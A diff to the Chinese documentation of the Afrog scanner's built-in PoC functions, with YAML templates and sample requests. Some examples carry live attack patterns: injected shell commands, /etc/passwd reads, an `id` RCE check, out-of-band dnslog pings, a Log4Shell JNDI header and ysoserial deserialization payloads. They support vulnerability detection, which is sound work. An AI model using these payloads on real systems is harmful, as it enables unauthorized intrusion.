@@ -1,8 +1,11 @@
 ## Afrog PoC 内置函数
+
 ### 注意事项
+
 在使用 Afrog 内置函数时，请注意以下事项：它们仅能在 set 和 expression 中声明，而不能直接在 path、headers、body 等位置使用。
 
 例如：
+
 ```yaml
 id: demo
 
@@ -21,25 +24,30 @@ rules:
       body: "{{randLowercase(32)}}" # 错误
     expression: true
 expression: r0()
-
 ```
+
 正确用法是首先在 set 内声明，详细用法请参考 [md5 函数示例](https://github.com/zan8in/afrog/blob/main/afrog-helper-function.md#md5)
 
 内置函数源码位置：`v2\pkg\runner\celcompile.go`
 
 ### randomInt
+
 生成一个指定长度的随机数字
 
 生成一个 10000, 99999 之间的随机数
+
 ```
 r1: randomInt(10000, 99999)
 ```
 
 生成一个 800000000, 1000000000 之间的随机数
+
 ```
 r1: randomInt(800000000, 1000000000)
 ```
+
 randomInt 完整示例
+
 ```yaml
 id: random-int-demo
 
@@ -59,19 +67,26 @@ rules:
     expression: true
 expression: r0()
 ```
+
 请求包
+
 ```
 GET /r1=60501&r2=986034118 HTTP/1.1
 Host: 192.168.66.166
 ```
+
 ### randomLowercase
+
 生成一个指定长度的随机字符串
 
-生成一个长度6的字符串
+生成一个长度 6 的字符串
+
 ```
 randstr: randomLowercase(6)
 ```
+
 randomLowercase 完整示例
+
 ```yaml
 id: random-string-demo
 
@@ -92,7 +107,9 @@ rules:
     expression: true
 expression: r0()
 ```
+
 请求包
+
 ```
 POST /filename=xszgrr.php HTTP/1.1
 Host: 192.168.66.166
@@ -104,42 +121,50 @@ uxqbyjmetnfxsvxdqeirapxmrzwolksf
 
 ### bcontains
 
-验证一个[]byte是否包含另一个[]byte的函数,区分大小写
+验证一个[]byte 是否包含另一个[]byte 的函数,区分大小写
 
 ```
 response.body.bcontains(b'ThinkPHP')
 response.raw_header.bcontains(b'Set-Cookie')
 ```
+
 ### ibcontains
 
-验证一个[]byte是否包含另一个[]byte的函数,不区分大小写
+验证一个[]byte 是否包含另一个[]byte 的函数,不区分大小写
 
 ```
 response.body.ibcontains(b'thinkphp')
 response.raw_header.ibcontains(b'set-cookie')
 ```
+
 ### contains
 
 验证一个字符串是否包含另一个字符串的函数,区分大小写
 
 ```
-response.headers["content-type"].icontains("application/json") 
+response.headers["content-type"].icontains("application/json")
 ```
+
 ### icontains
 
 验证一个字符串是否包含另一个字符串的函数,不区分大小写
+
 ```
-response.headers["location"].icontains("zabbix.php?action=dashboard.view") 
+response.headers["location"].icontains("zabbix.php?action=dashboard.view")
 ```
+
 ### replaceAll
+
 用于替换字符串中的所有匹配项
 
 基本用法
+
 ```
 r1: replaceAll("this is a test", "test", "Test")
 ```
 
 完整示例
+
 ```yaml
 id: replace-all-demo
 
@@ -159,7 +184,9 @@ rules:
     expression: true
 expression: r0()
 ```
+
 请求包
+
 ```
 POST / HTTP/1.1
 Host: 192.168.66.166
@@ -168,25 +195,31 @@ Content-Type: application/x-www-form-urlencoded
 
 this is a Test
 ```
+
 ### toUpper
+
 字符串转为大写
 
 ```
 r1: toUpper("admin")
 ```
+
 结果
+
 ```
 ADMIN
 ```
 
-
 ### toLower
+
 字符串转为小写
 
 ```
 r1: toLower("Admin")
 ```
+
 结果
+
 ```
 admin
 ```
@@ -196,20 +229,27 @@ admin
 md5 加密
 
 加密一个随机 Int 类型变量
+
 ```
-md5str: md5(string(randomInt(10000000, 50000000))) 
+md5str: md5(string(randomInt(10000000, 50000000)))
 ```
+
 加密一个随机 string 类型变量
+
 ```
 md5str: md5(randomLowercase(16))
 ```
+
 加密一个字符串
+
 ```
 md5str: md5("123456")
 ```
+
 md5 完整示例
 
 创建 md5-demo.yaml 文件，编写内容
+
 ```yaml
 id: md5-demo
 
@@ -234,7 +274,9 @@ rules:
     expression: true
 expression: r0()
 ```
+
 请求包
+
 ```text
 GET / HTTP/1.1
 Host: 192.168.66.166
@@ -242,23 +284,31 @@ Md5-1: a1291a39f613c3351516bf1e30ef3f40
 Md5-2: 30272788dca037d61cb8e6790c61692f
 Md5-3: e10adc3949ba59abbe56e057f20f883e
 ```
+
 ### base64
+
 对字符串或字节数组进行 Base64 编码
 
 编码一个字符串
+
 ```
 admin: base64("admin:admin")
 ```
+
 编码一个字节数组
+
 ```
 user: base64(bytes("user:user"))
 ```
+
 编码一个变量
+
 ```
 rInt1: randomInt(800000000, 1000000000)
 rInt2: randomInt(800000000, 1000000000)
 result: base64(string(rInt1+rInt2))
 ```
+
 base64 完整示例
 
 ```yaml
@@ -287,7 +337,9 @@ rules:
     expression: true
 expression: r0()
 ```
+
 请求包
+
 ```
 POST / HTTP/1.1
 Host: 192.168.66.166
@@ -298,11 +350,13 @@ User: dXNlcjp1c2Vy
 
 MTc0ODQzNDI5Nw==
 ```
+
 ### base64Decode
 
 对字符串或字节数组进行 Base64 解码
 
 base64 完整示例
+
 ```yaml
 id: base64-decode-demo
 
@@ -321,9 +375,10 @@ rules:
       body: "{{bodystr}}"
     expression: true
 expression: r0()
-
 ```
+
 请求包
+
 ```
 POST / HTTP/1.1
 Host: 192.168.66.166
@@ -344,13 +399,16 @@ originalCreateDate=wLSGP4oEzLKAz4=iz=66
 ```
 
 ### urlencode
+
 对字符串或字节数组进行 Url 编码
 
 ```
 password: urlencode(base64("1234"))
 
 ```
+
 urlencode 完整示例
+
 ```yaml
 id: url-encode-demo
 
@@ -365,14 +423,14 @@ set:
   base64Url: urlencode(base64("`echo " + content + " > " + filename + "`"))
   password: urlencode(base64("1234"))
   bodystr: |
-        <%@Register
-            TagPrefix = 'x'
-            Namespace = 'System.Runtime.Remoting.Services'
-            Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
-        %>
-        <x:RemotingService runat='server'
-            Context-Response-ContentType='xxx'
-        />
+    <%@Register
+        TagPrefix = 'x'
+        Namespace = 'System.Runtime.Remoting.Services'
+        Assembly = 'System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+    %>
+    <x:RemotingService runat='server'
+        Context-Response-ContentType='xxx'
+    />
   payload: urlencode(bodystr)
 rules:
   r0:
@@ -383,7 +441,9 @@ rules:
     expression: true
 expression: r0()
 ```
+
 请求包
+
 ```
 POST /user=admin&psw=MTIzNA%3D%3D&base64Url=YGVjaG8gZWFwZGh4aWogPiBlcGdkLnR4dGA%3D HTTP/1.1
 Host: 192.168.66.166
@@ -394,12 +454,15 @@ Content-Type: application/x-www-form-urlencoded
 ```
 
 ### urldecode
+
 对字符串或字节数组进行 Url 解码
 
 ```
 url: urldecode("https%3A%2F%2Fexample%2Ecom")
 ```
+
 urldecode 完整示例
+
 ```yaml
 id: url-decode-demo
 
@@ -416,11 +479,13 @@ rules:
       method: GET
       path: /
       headers:
-        Referer: '{{url}}'
+        Referer: "{{url}}"
     expression: true
 expression: r0()
 ```
+
 请求包
+
 ```
 GET / HTTP/1.1
 Host: 192.168.66.166
@@ -428,9 +493,11 @@ Referer: https://example.com
 ```
 
 ### hexdecode
+
 对字符串进行 hex 解码
 
 hexdecode 完整示例
+
 ```yaml
 id: hex-decode-demo
 
@@ -450,7 +517,9 @@ rules:
     expression: true
 expression: r0()
 ```
+
 请求包
+
 ```
 POST / HTTP/1.1
 Host: 192.168.66.166
@@ -461,34 +530,47 @@ x�
 �ff�b�����"AQN �d��\u�
 ?�!H��MJBC8����c�K-��f`d�����2�:>�58�+���I���`q�&�-�Pm��B,A� ���
 ```
+
 ### 日期
+
 各种日期格式拼接
 
 年
 比如：2023
+
 ```
 year = year(0)
 ```
+
 年简写
 比如：23
+
 ```
 shortYear = shortyear(0)
 ```
+
 月份
 比如：12
+
 ```
 month = month(0)
 ```
+
 日
 比如：02
+
 ```
 day = day(0)
 ```
+
 当前时间戳（秒）
+
 ```
 tsecond = timestamp_second(0)
 ```
+
 完整示例
+
 ```yaml
 id: date-demo
 
@@ -521,9 +603,10 @@ rules:
         L: "log={{pathname}}/{{logfile}}"
     expression: true
 expression: r0()
-
 ```
+
 请求包
+
 ```
 GET /log=2312/23_12_11.log HTTP/1.1
 Host: 192.168.66.166
@@ -535,10 +618,13 @@ Ms: 1702266237000
 L: log=2312/23_12_11.log
 Y: 2023
 ```
+
 ### versionCompare
+
 用于类似 2.89.1 > 2.67.30 版本号大小的判断，返回 True / False
 
 versionCompare 完整示例
+
 ```yaml
 id: CVE-2023-46604
 
@@ -577,7 +663,9 @@ rules:
       (versionCompare(string(version),">","5.18.0") && versionCompare(string(version),"<","5.18.3"))
 expression: r0() && r1()
 ```
+
 ### bsubmatch
+
 正则表达式处理中的一个函数，用于获取与指定子表达式匹配的部分字符串，用于提取匹配的子表达式内容。
 
 返回值：提取匹配的子表达式内容
@@ -587,6 +675,7 @@ bsubmatch 完整示例
 r0: 当登录请求成功且响应头包含 Set-Cookie 时，将其提取为变量 cookie。
 
 r1: 使用提取的 Cookie 访问首页 /index.php。
+
 ```yaml
 id: bsubmatch-demo
 
@@ -614,7 +703,9 @@ rules:
     expression: true
 expression: r0()
 ```
+
 r0 请求
+
 ```
 POST /login.php HTTP/1.1
 Host: 192.168.66.166
@@ -623,7 +714,9 @@ Content-Type: application/x-www-form-urlencoded
 
 username=admin&password=123456
 ```
+
 r0 响应
+
 ```
 HTTP/1.1 302
 Content-Type: text/html; charset=iso-8859-1
@@ -631,14 +724,18 @@ Date: Mon, 11 Dec 2023 06:06:42 GMT
 Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
 Set-Cookie: PHPSESSID=xxx.xxx; Path="/"
 ```
+
 r1 请求
+
 ```
 GET /index.php HTTP/1.1
 Host: 192.168.66.166
 Cookie: PHPSESSID=xxx.xxx; Path="/"
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
 ```
+
 r1 响应
+
 ```
 HTTP/1.1 200
 Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
@@ -654,12 +751,15 @@ Date: Mon, 11 Dec 2023 06:06:42 GMT
 ...
 </body></html>
 ```
+
 ### bmatches
+
 用于检查一个字符串是否与正则表达式匹配。
 
 返回值：True / False
 
 读取文件 /etc/passwd 并验证是否成功读取
+
 ```yaml
 id: fileread-demo
 
@@ -676,7 +776,9 @@ rules:
     expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0()
 ```
-执行系统命令` id `并验证是否成功执行
+
+执行系统命令`id`并验证是否成功执行
+
 ```yaml
 id: rce-demo
 
@@ -693,8 +795,10 @@ rules:
     expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
 expression: r0()
 ```
+
 ### oob()
-`oob()` 用于执行无回显的命令的POC，通过调用外部链接平台，在等待几秒钟后请求该外部链接平台，以验证是否成功接收到命令执行的信号。
+
+`oob()` 用于执行无回显的命令的 POC，通过调用外部链接平台，在等待几秒钟后请求该外部链接平台，以验证是否成功接收到命令执行的信号。
 
 oob() 漏洞验证要求配置 oob() 环境，[配置教程](https://github.com/zan8in/afrog?tab=readme-ov-file#ceye-configuration)
 
@@ -702,7 +806,7 @@ oob() 漏洞验证要求配置 oob() 环境，[配置教程](https://github.com/
 
 set 声明两个变量
 
-`oob`: 初始化一个 dnslog 
+`oob`: 初始化一个 dnslog
 
 `oobHTTP`: dnslog 的 url，比如 http://xxxxxx.xxyyy.ceye.io，一般用于 curl {{oobHTTP}} 操作
 
@@ -746,7 +850,9 @@ rules:
     expression: oobCheck(oob, oob.ProtocolHTTP, 3)
 expression: r0()
 ```
+
 请求包
+
 ```
 POST /rce.php HTTP/1.1
 Host: 192.168.66.166
@@ -763,6 +869,7 @@ Content-Type: application/x-www-form-urlencoded
   </params>
 </methodCall>
 ```
+
 #### OOB DNS
 
 ```yaml
@@ -784,7 +891,9 @@ rules:
     expression: oobCheck(oob, oob.ProtocolDNS, 3)
 expression: r0()
 ```
+
 请求包
+
 ```
 GET /cmd=`ping 36sSyqGPGpMZ.xxyy.dnslogxx.sh` HTTP/1.1
 Host: 192.168.66.166
@@ -814,22 +923,27 @@ rules:
     expression: oobCheck(oob, oob.ProtocolDNS, 3)
 expression: r0()
 ```
+
 请求包
+
 ```
 GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
 Host: 192.168.66.166
 X-Forwarded-For: ${jndi:ldap://x.x.x.x:1389/QW5qJX3cb16PKivauJxyWl}
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
 ```
+
 ### Ysoserial
+
 用于生成 Java 反序列化 payload
 
 基本用法
+
 ```
 ysoserial(payload, command, encode)
 ```
 
-payload: 攻击载荷，[支持payload列表](https://github.com/zan8in/afrog/blob/main/pkg/utils/ysoserial.go)
+payload: 攻击载荷，[支持 payload 列表](https://github.com/zan8in/afrog/blob/main/pkg/utils/ysoserial.go)
 
 command: 执行的命令，比如 xxx.dnslog.cn
 
@@ -840,12 +954,15 @@ encode: 加密方法，目前支持：base64 和 hex
 [CVE-2023-49070](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/pocs/afrog-pocs/CVE/2023/CVE-2023-49070.yaml#L2)、[CVE-2021-29200](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/pocs/afrog-pocs/CVE/2021/CVE-2021-29200.yaml)
 
 ### AesCBC
+
 用于 aes cbc 加密的 PoC
 
 基本用法
+
 ```
 aesCBC(text,key,iv)
 ```
+
 text: 被加密的字符串
 
 key: 加密 key
@@ -854,6 +971,10 @@ iv: 加密 iv
 
 返回加密结果
 
-参考示例 
+参考示例
 
 [CVE-2023-20888](https://github.com/zan8in/afrog/blob/46404e7527ca8d5752a9679ce13c83f7fd7b9e5b/pocs/afrog-pocs/CVE/2023/CVE-2023-20888.yaml)
+
+### 需要人工验证
+
+<img src="https://images.weserv.nl/?url=raw.githubusercontent.com/zan8in/afrog/main/images/verification-is-needed.png" />
